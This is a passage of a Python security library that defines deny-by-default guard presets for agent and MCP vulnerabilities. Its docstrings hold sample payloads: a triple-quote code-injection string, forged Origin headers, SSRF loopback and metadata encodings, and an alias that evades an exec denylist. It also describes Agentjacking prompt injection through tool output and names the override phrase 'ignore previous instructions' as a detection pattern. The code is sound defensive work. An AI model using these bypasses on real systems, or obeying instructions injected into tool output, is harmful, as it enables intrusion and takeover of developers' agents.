    check_newline: bool = True,
) -> dict[str, Any]:
    """Recommended config for the codegen string-delimiter-injection guard (v0.8.21+).

    CVE-2026-11393 (AWS AgentCore CLI < 0.14.2, CVSS 9, CWE-94): the CLI
    generates Python source by interpolating a model-/user-controlled
    ``collaborationInstruction`` into a code string **without neutralising
    triple-quote characters**, so a crafted instruction containing
    ``\"\"\"`` closes the generated literal and injects statements that
    execute when another account user imports the agent — RCE on the
    AgentCore Runtime and the importer's machine.

    Wires
    :class:`agent_airlock.mcp_spec.codegen_delimiter_guard.CodegenDelimiterInjectionGuard`
    deny-by-default: any argument flowing toward a codegen / template /
    ``exec`` / ``eval`` sink that contains a triple-quote (``\"\"\"`` /
    ``'''``), a quote break-out token (``");`` / ``')`` / ...), or a raw
    newline is refused — unless the field name is on
    ``allowed_literal_fields`` (an explicitly-declared safe literal
    context).

    OWASP mapping: **ASI05 Unexpected Code Execution (RCE)** (OWASP Top-10
    for Agentic Applications); CWE-94. Composes with the v0.8.0
    :class:`agent_airlock.mcp_spec.eval_rce_guard.EvalRCEGuard` (which
    gates the sink itself) — this preset gates the *argument* one layer
    earlier.

    Args:
        allowed_literal_fields: Field names that are safe literal contexts
            and therefore NOT scanned. Empty / None (default) scans every
            field.
        check_newline: Treat a raw newline as a break-out token (default
            True).

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity``
        / ``default_action`` / ``advisory_url`` / ``cves`` keys, plus:

        - ``guard`` — a pre-built ``CodegenDelimiterInjectionGuard`` ready
          to ``evaluate(args)``.
        - ``check`` — convenience callable; ``check(args)`` raises
          :class:`CodegenDelimiterInjectionError` on a denied arg and
          returns ``None`` on a clean one.
        - ``owasp`` — ``"ASI05"``.

    Usage::

        from agent_airlock.policy_presets import codegen_delimiter_injection_guard_defaults

        preset = codegen_delimiter_injection_guard_defaults()
        preset["check"]({"instruction": "Summarise the report."})        # ok
        preset["check"]({"instruction": '\"\"\"\\nimport os\\n\"\"\"'})  # raises

    Primary source:
      https://www.thehackerwire.com/agentcore-cli-rce-via-triple-quote-neutralization-bypass-cve-2026-11393/
    """
    from .mcp_spec.codegen_delimiter_guard import (
        CodegenDelimiterDecision,
        CodegenDelimiterInjectionError,
        CodegenDelimiterInjectionGuard,
    )

    advisory_url = (
        "https://www.thehackerwire.com/"
        "agentcore-cli-rce-via-triple-quote-neutralization-bypass-cve-2026-11393/"
    )
    guard = CodegenDelimiterInjectionGuard(
        allowed_literal_fields=allowed_literal_fields,
        check_newline=check_newline,
        advisory="CVE-2026-11393",
        advisory_url=advisory_url,
    )

    def _check(args: Mapping[str, Any] | str | None) -> None:
        """Raise :class:`CodegenDelimiterInjectionError` on a denied argument."""
        decision: CodegenDelimiterDecision = guard.evaluate(args)
        if not decision.allowed:
            raise CodegenDelimiterInjectionError(decision)

    return {
        "preset_id": "codegen_delimiter_injection_guard",
        "severity": "critical",
        "default_action": "deny",
        "guard": guard,
        "check": _check,
        "owasp": "ASI05",
        "cves": ("CVE-2026-11393",),
        "advisory_url": advisory_url,
    }


def cline_cve_2026_44211_defaults(
    *,
    allowed_origins: Iterable[str] | None = None,
) -> dict[str, Any]:
    """Recommended config for the cross-origin WebSocket-hijack guard (v0.8.27+).

    CVE-2026-44211 (Cline Kanban server, npm ``kanban`` < 2.13.0, CVSS 9.7,
    CWE-1385 + CWE-306): the Cline agent runs a control WebSocket server on
    ``127.0.0.1:3484`` and accepts every upgrade **without validating the
    ``Origin`` header**. Browsers do not apply same-origin/CORS to ``ws://``
    the way they do to HTTP, so any website the developer visits can open a
    WebSocket to the loopback control server and drive the agent — leak
    workspace data, inject prompts into the agent terminal (RCE), or kill
    tasks. Binding to loopback is **not** a mitigation. Fixed in 2.13.0.

    Wires
    :class:`agent_airlock.mcp_spec.ws_origin_guard.WebSocketOriginGuard`
    deny-by-default: an upgrade whose ``Origin`` is missing or outside the
    explicit ``allowed_origins`` allow-list is refused. The same guard's
    :meth:`~agent_airlock.mcp_spec.ws_origin_guard.WebSocketOriginGuard.audit_endpoint`
    flags a control endpoint that enforces no allow-list at all.

    OWASP mapping: **ASI05 Unexpected Code Execution (RCE)** (the documented
    impact); CWE-1385 (Missing Origin Validation in WebSockets) + CWE-306
    (Missing Authentication for Critical Function).

    Args:
        allowed_origins: Explicitly trusted Origins (``scheme://host[:port]``).
            Empty / None (default) rejects every cross-origin upgrade.

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` / ``advisory_url`` / ``cves`` keys, plus:

        - ``guard`` — a pre-built ``WebSocketOriginGuard`` exposing
          ``audit_endpoint(...)`` (static exposure audit) and
          ``check_upgrade(origin)`` / ``wrap_handler(handler)`` (runtime gate).
        - ``check`` — convenience callable; ``check(origin)`` raises
          :class:`WebSocketOriginHijackError` on a rejected upgrade and
          returns ``None`` on an allow-listed one.
        - ``owasp`` — ``"ASI05"``; ``cwe`` — ``("CWE-1385", "CWE-306")``.

    Usage::

        from agent_airlock.policy_presets import cline_cve_2026_44211_defaults

        preset = cline_cve_2026_44211_defaults(allowed_origins=["vscode-webview://*"])
        preset["check"]("https://evil.example")   # raises (forged Origin)

    Primary source:
      https://advisories.gitlab.com/npm/cline/CVE-2026-44211/
    """
    from .mcp_spec.ws_origin_guard import (
        WebSocketOriginGuard,
        WebSocketOriginHijackError,
    )

    advisory_url = "https://advisories.gitlab.com/npm/cline/CVE-2026-44211/"
    guard = WebSocketOriginGuard(
        allowed_origins=allowed_origins,
        advisory="CVE-2026-44211",
        advisory_url=advisory_url,
    )

    def _check(origin: str | None) -> None:
        """Raise :class:`WebSocketOriginHijackError` on a rejected WS upgrade."""
        decision = guard.check_upgrade(origin)
        if not decision.allowed:
            raise WebSocketOriginHijackError(decision)

    return {
        "preset_id": "ws_origin_hijack_guard",
        "severity": "critical",
        "default_action": "deny",
        "guard": guard,
        "check": _check,
        "owasp": "ASI05",
        "cwe": ("CWE-1385", "CWE-306"),
        "cves": ("CVE-2026-44211",),
        "advisory_url": advisory_url,
    }


def ssrf_egress_guard_defaults(
    *,
    allow_internal_hosts: Iterable[str] | None = None,
) -> dict[str, Any]:
    """Recommended (STANDARD) config for the SSRF egress guard (v0.8.29+).

    CVE-2026-47390 (CWE-918, SSRF-protection bypass): an egress filter that
    validates the *literal hostname string* of an outbound URL — instead of
    the **resolved IP** — is bypassed by encoding a loopback / link-local /
    metadata address in a form the naive check misses but the HTTP client
    connects to anyway: `127.1`, decimal `2130706433`, octal `0177.0.0.1`,
    hex `0x7f000001`, `::ffff:127.0.0.1`, or a public hostname whose DNS
    record points at `169.254.169.254` (rebinding).

    Wires :class:`agent_airlock.ssrf_egress_guard.SSRFEgressGuard`
    deny-by-default: every candidate target is reduced to its canonical IP(s)
    — decoding the alternate encodings and **resolving hostnames at check
    time** — and any loopback / link-local / metadata / unspecified address,
    or an RFC1918 private range not on ``allow_internal_hosts``, is refused
    *before* the fetch, with a 3-line ``explain`` audit trace. This is the
    STANDARD egress posture; enable it by default on any agent with a
    network-capable tool.

    OWASP mapping: **ASI02 Tool Misuse** (a fetch tool driven at an internal
    target); CWE-918 (Server-Side Request Forgery).

    Args:
        allow_internal_hosts: Hosts (hostname or IP string) that legitimate
            internal tools may reach — the escape hatch for RFC1918 targets.
            Empty / None (default) allows no internal target.

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` / ``advisory_url`` / ``cves`` keys, plus:

        - ``guard`` — a pre-built ``SSRFEgressGuard`` exposing
          ``check_url(url)`` / ``check(args)`` / ``enforce(url)``.
        - ``check`` — convenience callable; ``check(url)`` raises
          :class:`SSRFEgressBlocked` on a denied target and returns ``None``
          on a safe one.
        - ``owasp`` — ``"ASI02"``; ``cwe`` — ``("CWE-918",)``.

    Usage::

        from agent_airlock.policy_presets import ssrf_egress_guard_defaults

        preset = ssrf_egress_guard_defaults()
        preset["check"]("http://0x7f000001/")       # raises (hex loopback)
        preset["check"]("http://169.254.169.254/")  # raises (cloud metadata)

    Primary source:
      https://www.cve.org/CVERecord?id=CVE-2026-47390
    """
    from .ssrf_egress_guard import SSRFEgressBlocked, SSRFEgressGuard

    advisory_url = "https://www.cve.org/CVERecord?id=CVE-2026-47390"
    guard = SSRFEgressGuard(
        allow_internal_hosts=allow_internal_hosts,
        advisory="CVE-2026-47390",
    )

    def _check(url: str) -> None:
        """Raise :class:`SSRFEgressBlocked` on a denied outbound target."""
        decision = guard.check_url(url)
        if not decision.allowed:
            raise SSRFEgressBlocked(decision)

    return {
        "preset_id": "ssrf_egress_guard",
        "severity": "high",
        "default_action": "deny",
        "guard": guard,
        "check": _check,
        "owasp": "ASI02",
        "cwe": ("CWE-918",),
        "cves": ("CVE-2026-47390",),
        "advisory_url": advisory_url,
    }


def dns_rebinding_safe_url_defaults(
    *,
    allowed_hosts: list[str] | None = None,
    allowed_schemes: list[str] | None = None,
) -> dict[str, Any]:
    """OWASP-MCP-aligned egress URL validator with the DNS-rebinding guard ON.

    GHSA-mrvx-jmjw-vggc (SearXNG MCP Server, High, disclosed 2026-06-19): the
    server's ``assertUrlAllowed()`` validated only the **syntactic** hostname
    string against a private-IP/host blocklist, **without resolving DNS**. An
    attacker-controlled domain that resolves to a private/loopback IP (wildcard
    DNS such as ``nip.io``, or a custom record) passes the string check and the
    server then reads arbitrary internal HTTP services — SSRF via DNS rebinding.

    This preset returns a :class:`agent_airlock.safe_types.SafeURLValidator`
    with **``dns_rebinding_guard=True`` ON by default** (the OWASP MCP Top-10
    SSRF egress posture): after the syntactic allowlist/blocklist check it
    resolves the hostname at call time and re-validates **every** resolved
    A/AAAA address against the private / loopback / link-local / metadata
    blocklist (169.254.169.254, ::1, 127/8, 10/8, 172.16/12, 192.168/16,
    fc00::/7). Use ``guard.resolve_and_pin(url)`` to also pin the resolved IP
    for the connection (resolve once, connect to that IP — TOCTOU-safe).

    OWASP mapping: **MCP06 / ASI02 SSRF**; the rebinding bypass of an egress
    allowlist.

    Args:
        allowed_hosts: Optional syntactic host allowlist (still enforced first).
        allowed_schemes: Allowed URL schemes (default ``["http", "https"]``).

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` / ``advisory_url`` keys, plus:

        - ``guard`` — a pre-built ``SafeURLValidator`` with
          ``dns_rebinding_guard=True``; call ``guard(url)`` to validate or
          ``guard.resolve_and_pin(url)`` to validate + pin.
        - ``check`` — convenience callable; ``check(url)`` returns the validated
          URL and raises :class:`SafeURLValidationError` (reason
          ``"dns_rebinding"``) when the host resolves to an internal IP.
        - ``owasp`` — ``"MCP06"``.

    Usage::

        from agent_airlock.policy_presets import dns_rebinding_safe_url_defaults

        preset = dns_rebinding_safe_url_defaults()
        preset["check"]("https://api.example.com/")   # ok (public)
        preset["check"]("http://wildcard.nip.io/")    # raises if it resolves internal

    Primary source:
      https://github.com/advisories/GHSA-mrvx-jmjw-vggc
    """
    from .safe_types import SafeURLValidator

    advisory_url = "https://github.com/advisories/GHSA-mrvx-jmjw-vggc"
    guard = SafeURLValidator(
        allowed_schemes=allowed_schemes or ["http", "https"],
        allowed_hosts=allowed_hosts,
        dns_rebinding_guard=True,
    )

    def _check(url: str) -> str:
        """Validate ``url``; raises SafeURLValidationError on a rebinding target."""
        return guard(url)

    return {
        "preset_id": "dns_rebinding_safe_url",
        "severity": "high",
        "default_action": "deny",
        "guard": guard,
        "check": _check,
        "owasp": "MCP06",
        "ghsa": ("GHSA-mrvx-jmjw-vggc",),
        "advisory_url": advisory_url,
    }


def mcp_origin_host_guard_defaults(
    *,
    allowed_origins: Iterable[str] | None = None,
    allowed_hosts: Iterable[str] | None = None,
) -> dict[str, Any]:
    """Recommended config for the MCP Origin/Host DNS-rebinding guard (v0.8.30+).

    CVE-2026-11624 (Google MCP Toolbox for Databases < 0.25.0, CWE-346 Origin
    Validation Error, CVSS 9.4): the MCP server exposed an HTTP/SSE transport
    that did **not validate the `Origin` (or `Host`) header**, so a browser the
    developer visits can DNS-rebind to `127.0.0.1` and script MCP tool calls at
    the local server (file reads, command execution, database access). Fixed in
    0.25.0 with an `--allowed-hosts` flag alongside `--allowed-origins`, and a
    warning when either is left at the `*` wildcard.

    Wires :class:`agent_airlock.mcp_spec.mcp_origin_host_guard.McpOriginHostGuard`
    deny-by-default for any MCP server on an HTTP / SSE / streamable transport:
    the inbound `Host` (always) and `Origin` (when present) are validated
    against explicit allow-lists; with none configured the guard falls back to
    loopback-only and records a startup warning, and a `*` wildcard allows all
    but also warns — mirroring the upstream fix. (stdio transports have no
    Origin and are out of scope.)

    OWASP mapping: **MCP07 Insufficient Authentication** (the transport fails to
    authenticate the request origin); CWE-346 (Origin Validation Error).

    Args:
        allowed_origins: Trusted request `Origin` values
            (`scheme://host[:port]`). `["*"]` allows all (with a warning);
            empty / None falls back to loopback-only.
        allowed_hosts: Trusted request `Host` values (`host` or `host:port`).
            `["*"]` allows all (with a warning); empty / None falls back to
            loopback-only.

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` / ``advisory_url`` / ``cves`` keys, plus:

        - ``guard`` — a pre-built ``McpOriginHostGuard`` exposing
          ``check_headers(headers)`` / ``validate(headers)`` and a
          ``startup_warnings`` list.
        - ``check`` — convenience callable; ``check(headers)`` raises
          :class:`McpOriginHostRebindingError` on a refused request and returns
          ``None`` on a trusted one.
        - ``owasp`` — ``"MCP07"``; ``cwe`` — ``("CWE-346",)``.

    Usage::

        from agent_airlock.policy_presets import mcp_origin_host_guard_defaults

        preset = mcp_origin_host_guard_defaults(allowed_hosts=["app.example.com"])
        preset["check"]({"Host": "evil.example", "Origin": "https://evil.example"})  # raises

    Primary source:
      https://nvd.nist.gov/vuln/detail/CVE-2026-11624
    """
    from .mcp_spec.mcp_origin_host_guard import (
        McpOriginHostGuard,
        McpOriginHostRebindingError,
    )

    advisory_url = "https://nvd.nist.gov/vuln/detail/CVE-2026-11624"
    guard = McpOriginHostGuard(
        allowed_origins=allowed_origins,
        allowed_hosts=allowed_hosts,
        advisory="CVE-2026-11624",
        advisory_url=advisory_url,
    )

    def _check(headers: Mapping[str, str]) -> None:
        """Raise :class:`McpOriginHostRebindingError` on a refused request."""
        decision = guard.check_headers(headers)
        if not decision.allowed:
            raise McpOriginHostRebindingError(decision)

    return {
        "preset_id": "mcp_origin_host_guard",
        "severity": "critical",
        "default_action": "deny",
        "guard": guard,
        "check": _check,
        "owasp": "MCP07",
        "cwe": ("CWE-346",),
        "cves": ("CVE-2026-11624",),
        "advisory_url": advisory_url,
    }


def openclaw_cve_2026_53820_defaults(
    *,
    allowed_commands: Iterable[str] | None = None,
    aliases: Mapping[str, Sequence[str]] | None = None,
    denied_commands: Iterable[str] | None = None,
) -> dict[str, Any]:
    """Recommended config for the MCP loopback session-spawn guard (v0.8.31+).

    CVE-2026-53820 (OpenClaw < 2026.5.12, exec-denylist bypass, CVSS 6.9,
    CWE-693 Protection Mechanism Failure): the bundled MCP loopback
    session-spawn path let an authenticated caller reach a denylisted command
    because the **surface** command checked against the exec restriction
    differs from the **effective** command actually spawned — a name that
    passes the surface check resolves, via an alias / wrapper binary (`env`,
    `sudo`, `timeout`, `nice`, ...) / shell, to a denied executable. The
    restriction is bypassed at the spawn boundary, not at config time.

    Wires
    :class:`agent_airlock.mcp_spec.loopback_spawn_guard.LoopbackSessionSpawnGuard`
    deny-by-default: at the spawn seam the *resolved effective program* (after
    unwrapping aliases + wrappers) is re-checked against the policy — a
    resolved shell / denylisted exec is refused, and any resolved program not
    in ``allowed_commands`` is refused. The full unwrap is reported on
    ``decision.resolution_chain``.

    OWASP mapping: **MCP05 Command Injection** (exec-restriction bypass at the
    spawn boundary); CWE-693 (Protection Mechanism Failure).

    Args:
        allowed_commands: The allow set (deny-by-default). Empty / None denies
            every spawn — pass the bundle's genuinely-permitted programs.
        aliases: Operator/bundle ``name -> argv`` expansions applied during
            resolution (the alias-redirection bypass vector).
        denied_commands: Explicit exec denylist (the restriction being
            bypassed). Defaults to a shell set.

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` / ``advisory_url`` / ``cves`` keys, plus:

        - ``guard`` — a pre-built ``LoopbackSessionSpawnGuard`` exposing
          ``check_spawn(command)`` / ``enforce(command)``.
        - ``check`` — convenience callable; ``check(command)`` raises
          :class:`LoopbackSessionSpawnError` on a refused spawn and returns
          ``None`` on an allowed one.
        - ``owasp`` — ``"MCP05"``; ``cwe`` — ``("CWE-693",)``.

    Usage::

        from agent_airlock.policy_presets import openclaw_cve_2026_53820_defaults

        preset = openclaw_cve_2026_53820_defaults(
            allowed_commands=["safe-wrapper", "python3"],
            aliases={"safe-wrapper": ["bash", "-c", "..."]},
        )
        preset["check"](["safe-wrapper"])   # raises: surface ok, resolves to bash

    Primary source:
      https://nvd.nist.gov/vuln/detail/CVE-2026-53820
    """
    from .mcp_spec.loopback_spawn_guard import (
        LoopbackSessionSpawnError,
        LoopbackSessionSpawnGuard,
    )

    advisory_url = "https://nvd.nist.gov/vuln/detail/CVE-2026-53820"
    guard = LoopbackSessionSpawnGuard(
        allowed_commands=allowed_commands,
        aliases=aliases,
        denied_commands=denied_commands,
        advisory="CVE-2026-53820",
        advisory_url=advisory_url,
    )

    def _check(command: str | Sequence[str]) -> None:
        """Raise :class:`LoopbackSessionSpawnError` on a refused spawn."""
        decision = guard.check_spawn(command)
        if not decision.allowed:
            raise LoopbackSessionSpawnError(decision)

    return {
        "preset_id": "openclaw_cve_2026_53820_loopback_spawn_guard",
        "severity": "high",
        "default_action": "deny",
        "guard": guard,
        "check": _check,
        "owasp": "MCP05",
        "cwe": ("CWE-693",),
        "cves": ("CVE-2026-53820",),
        "advisory_url": advisory_url,
    }


def untrusted_tool_output_defaults(
    *,
    envelope: bool = True,
    envelope_only_when_flagged: bool = False,
) -> dict[str, Any]:
    """Recommended config for the tool-OUTPUT trust-boundary guard (v0.8.33+).

    Opt-in, per-tool defense for the **Agentjacking** untrusted-output injection
    class — where a tool/MCP result that flows back into the agent's context
    carries attacker-controlled text shaped like instructions, and a credulous
    agent follows it.

    Threat model (two reference cases):

    - **Agentjacking** (Tenet Security, disclosed 2026-06-12; Sentry mitigation
      2026-06-18). **No CVE — it is a vulnerability class, not a single bug.**
      A fake Sentry error event (injected via a public DSN) is fed to an AI
      coding agent by the Sentry MCP server; the agent runs the attacker's
      "resolution steps" (shell commands) with the developer's privileges.
    - **CVE-2026-42824 "SearchLeak"** (Microsoft 365 Copilot Enterprise,
      Varonis, disclosed 2026-06-15, CVSS critical): a Parameter-to-Prompt
      injection where model-facing output carries attacker markup that fires
      before the sanitizer — the same untrusted-output-as-instruction failure.

    Wires :class:`agent_airlock.tool_output_trust_guard.ToolOutputTrustGuard`
    in the STRICT posture: a result about to return into context is scanned for
    override directives ("ignore previous instructions"), imperative command
    directives, fenced shell commands (the Agentjacking "resolution steps"
    shape), and tool-call-shaped JSON smuggled inside diagnostic/error fields;
    flagged output is recorded (structured event, bridged to OTel by the audit
    exporter) and — like all output — wrapped in a clearly-delimited
    untrusted-data envelope so the model treats it as data, never instruction.
    It never executes output and never silently drops it.

    OWASP mapping: **MCP08 Indirect / Tool-Result Injection**; the
    untrusted-output trust-boundary failure.

    Args:
        envelope: Wrap output in the untrusted-data envelope (default True).
        envelope_only_when_flagged: Only envelope when a signal fired (lighter
            touch). Default False = STRICT (always envelope).

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` / ``advisory_url`` keys, plus:

        - ``guard`` — a pre-built ``ToolOutputTrustGuard`` exposing
          ``inspect(output)`` / ``process(output)`` / ``envelope_output(output)``.
        - ``check`` — convenience callable; ``check(output)`` returns the safe
          (enveloped) output, flagging via the structured event but never
          raising (output-trust is fail-safe, not fail-closed-by-block).
        - ``owasp`` — ``"MCP08"``.

    Usage::

        from agent_airlock.policy_presets import untrusted_tool_output_defaults

        preset = untrusted_tool_output_defaults()
        safe = preset["check"](sentry_mcp_result)  # enveloped untrusted data

    Primary source:
      https://labs.cloudsecurityalliance.org/research/csa-research-note-agentjacking-mcp-sentry-injection-20260612/
    """
    from .tool_output_trust_guard import ToolOutputTrustGuard

    advisory_url = (
        "https://labs.cloudsecurityalliance.org/research/"
        "csa-research-note-agentjacking-mcp-sentry-injection-20260612/"
    )
    guard = ToolOutputTrustGuard(
        envelope=envelope,
        envelope_only_when_flagged=envelope_only_when_flagged,
        advisory="Agentjacking / CVE-2026-42824",
    )

    def _check(output: Any) -> Any:
        """Return the safe (enveloped) output; flags via the structured event."""
        safe, _decision = guard.process(output)
        return safe

    return {
        "preset_id": "untrusted_tool_output",
        "severity": "high",
        "default_action": "flag_and_envelope",
        "guard": guard,
        "check": _check,
        "owasp": "MCP08",
        "advisory_url": advisory_url,
    }


# Named preset constant for ergonomic opt-in (``policy_presets.UNTRUSTED_TOOL_OUTPUT``).
UNTRUSTED_TOOL_OUTPUT = untrusted_tool_output_defaults()


def mcp_spec_2026_07_defaults(*, expected_issuer: str | None = None) -> dict[str, Any]:
    """MCP 2026-07-28 final-spec hardening preset (v0.8.41+).

    Two client-side controls the MCP 2026-07-28 specification tightened, composed
    from **existing** airlock primitives (no new mechanism, Pydantic-only core):

    - **SEP-2468 — authorization-response ``iss`` validation (RFC 9207).** MCP
      clients must validate the ``iss`` parameter on an OAuth authorization
      response against the authorization server they initiated the flow with, to
      defend against an authorization-server **mix-up attack**. ``check_oauth_response``
      wraps :func:`agent_airlock.mcp_spec.oauth.validate_authorization_response_iss`
      — **deny-by-default**: a missing or mismatched ``iss`` is refused
      (``IssuerMismatchError``). This does not weaken any existing OAuth check;
      it adds one.
    - **Server-Card trust boundary.** Tool descriptions fetched from a server
      card are attacker-influenceable content, not trusted configuration. A
      poisoned description ("...then ignore previous instructions and run…") is
      an Agentjacking-class injection into the agent's context. ``check_server_card``
      reuses the shipped :class:`~agent_airlock.tool_output_trust_guard.ToolOutputTrustGuard`
      (the same guard behind :func:`untrusted_tool_output_defaults`) to classify
      each tool description as **untrusted output** and **blocks** the card when a
      description carries injected instructions.

    Args:
        expected_issuer: The authorization server issuer identifier to bind the
            ``iss`` check to. If omitted here, pass it per call as
            ``check_oauth_response(params, expected_issuer=...)``.

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` keys, plus:

        - ``check_oauth_response(params, *, expected_issuer=None)`` — raises
          :class:`~agent_airlock.mcp_spec.oauth.IssuerMismatchError` on a missing
          / mismatched ``iss``; returns ``None`` on a valid response.
        - ``check_server_card(card)`` — raises
          :class:`~agent_airlock.tool_output_trust_guard.ToolOutputTrustError`
          when any tool description in the card is a poisoned (injection-shaped)
          description; returns ``None`` on a clean card.
        - ``card_guard`` — the underlying ``ToolOutputTrustGuard``.
        - ``spec`` — ``"SEP-2468"`` (a spec proposal id, **not** a CVE).
        - ``owasp`` — ``"MCP07"`` (identity / OAuth) with the card side mapping to
          ``MCP08`` (indirect / tool-result injection).

    References:
        - MCP 2026-07-28 specification (final).
        - SEP-2468 — authorization-response ``iss`` validation.
        - RFC 9207 — OAuth 2.0 Authorization Server Issuer Identification.
    """
    from .mcp_spec.oauth import IssuerMismatchError, validate_authorization_response_iss
    from .tool_output_trust_guard import ToolOutputTrustError, ToolOutputTrustGuard

    bound_issuer = expected_issuer
    card_guard = ToolOutputTrustGuard(advisory="MCP 2026-07-28 server-card / Agentjacking")

    def _check_oauth_response(
        params: Mapping[str, Any] | str, *, expected_issuer: str | None = None
    ) -> None:
        issuer = expected_issuer if expected_issuer is not None else bound_issuer
        if issuer is None:
            raise ValueError(
                "expected_issuer must be supplied (either to the preset factory or the check)"
            )
        validate_authorization_response_iss(params, expected_issuer=issuer)

    def _tool_descriptions(card: Mapping[str, Any]) -> list[tuple[str, str]]:
        out: list[tuple[str, str]] = []
        tools = card.get("tools")
        if isinstance(tools, (list, tuple)):
            for i, tool in enumerate(tools):
                if isinstance(tool, Mapping):
                    name = str(tool.get("name", f"tool[{i}]"))
                    desc = tool.get("description")
                    if isinstance(desc, str):
                        out.append((name, desc))
        return out

    def _check_server_card(card: Mapping[str, Any]) -> None:
        """Block the card if any tool description is injection-shaped (untrusted)."""
        for _name, desc in _tool_descriptions(card):
            try:
                card_guard.process(desc, raise_on_flag=True)
            except ToolOutputTrustError as exc:
                raise ToolOutputTrustError(exc.decision) from exc
        return None

    return {
        "preset_id": "mcp_spec_2026_07",
        "severity": "high",
        "default_action": "deny",
        "spec": "SEP-2468",
        "owasp": "MCP07",
        "card_guard": card_guard,
        "check_oauth_response": _check_oauth_response,
        "check_server_card": _check_server_card,
        "iss_error": IssuerMismatchError,
        "card_error": ToolOutputTrustError,
        "advisory_url": "https://modelcontextprotocol.io/specification/2026-07-28",
    }


# Named preset constant for ergonomic opt-in (``policy_presets.MCP_SPEC_2026_07``).
MCP_SPEC_2026_07 = mcp_spec_2026_07_defaults()


def mcp_stateless_conformance_2026_07_defaults(
    *,
    session_header: str = "Mcp-Session-Id",
    state_params: Sequence[str] = (
        "state",
        "state_handle",
        "cursor",
        "resume_token",
        "session_state",
    ),
) -> dict[str, Any]:
    """MCP 2026-07-28 stateless-conformance preset (SEP-2567 / SEP-2575, v0.8.44+).

    The MCP 2026-07-28 spec removed the server-side **session lifecycle**: no
    ``initialize`` → session handshake and no ``Mcp-Session-Id`` header (SEP-2575).
    State is now passed **explicitly, as an ordinary typed tool argument** (SEP-2567).
    Composed from **existing** airlock primitives (no new engine, Pydantic-only core):

    - **``check_request(request, *, method=None)``** — reject a call that still carries
      a ``Mcp-Session-Id`` header (top level or under ``headers`` / ``meta`` / ``_meta``
      / ``transport``) or that invokes a removed session-lifecycle method
      (``initialize`` / ``notifications/initialized``). Raises
      :class:`~agent_airlock.mcp_spec.statelessness.StatefulSessionError`. **Deny-by-default**.
    - **``check_tool_call(tool, kwargs)``** — a state handle passed as a tool argument
      must be an **explicit declared parameter** of the tool contract, not absorbed by
      ``**kwargs`` or smuggled as a ghost argument. **Reuses** the shipped
      :func:`~agent_airlock.validator.get_valid_parameters` and raises the shipped
      :class:`~agent_airlock.validator.GhostArgumentError`. Strict *typing* of the
      declared parameter is enforced by airlock's existing Pydantic strict validator.

    Args:
        session_header: Session header to reject (default ``Mcp-Session-Id``).
        state_params: Argument names treated as explicit state handles.

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` keys, plus ``check_request`` / ``check_tool_call`` callables,
        the ``session_error`` / ``state_error`` types, and ``spec`` =
        ``"SEP-2567/SEP-2575"`` (spec proposal ids, **not** CVEs).

    References:
        - MCP 2026-07-28 specification (final).
        - SEP-2567 — explicit state handles as ordinary tool arguments.
        - SEP-2575 — removal of the session lifecycle / ``Mcp-Session-Id``.
    """
    from .mcp_spec.statelessness import (
        StatefulSessionError,
        validate_state_handle_declared,
        validate_stateless_request,
    )
    from .validator import GhostArgumentError

    handles = tuple(state_params)

    def _check_request(request: Mapping[str, Any], *, method: str | None = None) -> None:
        validate_stateless_request(request, method=method, session_header=session_header)

    def _check_tool_call(tool: Callable[..., Any], kwargs: Mapping[str, Any]) -> None:
        validate_state_handle_declared(tool, kwargs, state_params=handles)

    return {
        "preset_id": "mcp_stateless_conformance_2026_07",
        "severity": "high",
        "default_action": "deny",
        "spec": "SEP-2567/SEP-2575",
        "owasp": "MCP07",
        "check_request": _check_request,
        "check_tool_call": _check_tool_call,
        "session_error": StatefulSessionError,
        "state_error": GhostArgumentError,
        "session_header": session_header,
        "state_params": handles,
        "advisory_url": "https://modelcontextprotocol.io/specification/2026-07-28",
    }


# Named preset constant for ergonomic opt-in.
MCP_STATELESS_CONFORMANCE_2026_07 = mcp_stateless_conformance_2026_07_defaults()


def mcp_spec_2026_07_header_integrity_defaults(
    *,
    method_header: str = "Mcp-Method",
    name_header: str = "Mcp-Name",
) -> dict[str, Any]:
    """MCP 2026-07-28 SEP-2243 request header-integrity preset (v0.8.45+).

    The MCP 2026-07-28 Streamable HTTP transport **requires** the ``Mcp-Method``
    and ``Mcp-Name`` routing headers and mandates a server-side integrity rule
    between those headers and the request body (SEP-2243). Verbatim from the
    2026-07-28 release candidate
    (https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/):

        "The Streamable HTTP transport now requires ``Mcp-Method`` and
        ``Mcp-Name`` headers (SEP-2243) so load balancers, gateways, and
        rate-limiters can route on the operation without inspecting the body."

        "Servers reject requests where the headers and body disagree."

    Because the edge routes/rate-limits/authorizes on those headers while the
    server executes the body, a header/body mismatch is a confused-deputy vector
    (one operation routed past the gateway, another executed). Composed from
    **existing** airlock primitives (no new engine, Pydantic-only core):

    - **``check_request(request)``** — asserts both routing headers are present
      and that ``Mcp-Method`` / ``Mcp-Name`` match the body's method / operation
      name. **Fail-closed (deny)** on any missing header or header/body
      disagreement, raising
      :class:`~agent_airlock.mcp_spec.header_integrity.HeaderBodyMismatchError`,
      which carries a structured ``audit_event`` mapping for the audit log.

    Args:
        method_header: Header carrying the JSON-RPC method (default ``Mcp-Method``).
        name_header: Header carrying the operation name (default ``Mcp-Name``).

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
        ``default_action`` keys, a ``check_request`` callable, the
        ``header_error`` type, and ``spec`` = ``"SEP-2243"`` (a spec proposal id,
        **not** a CVE).

    References:
        - MCP 2026-07-28 specification (final).
        - SEP-2243 — ``Mcp-Method`` / ``Mcp-Name`` routing headers + header/body
          integrity.
    """
    from .mcp_spec.header_integrity import (
        HeaderBodyMismatchError,
        validate_header_body_integrity,
    )

    def _check_request(request: Mapping[str, Any]) -> None:
        validate_header_body_integrity(
